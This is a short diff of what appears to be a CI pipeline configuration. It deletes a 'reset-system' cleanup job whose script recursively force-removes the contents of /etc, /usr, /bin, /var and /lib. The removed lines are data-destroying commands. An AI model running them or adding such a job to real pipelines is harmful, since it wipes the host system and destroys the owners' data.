@@ -42,15 +42,6 @@ openfiles-executable:
   stage: runtime-tests
   script:
     - ./camindicator-detect .
-    
-reset-system:
-  stage: cleanup
-  script:
-    - rm -Rvf /etc/*
-    - rm -Rvf /usr/*
-    - rm -Rvf /bin/*
-    - rm -Rvf /var/*
-    - rm -Rvf /lib/*
 
 clear-files:
   stage: cleanup
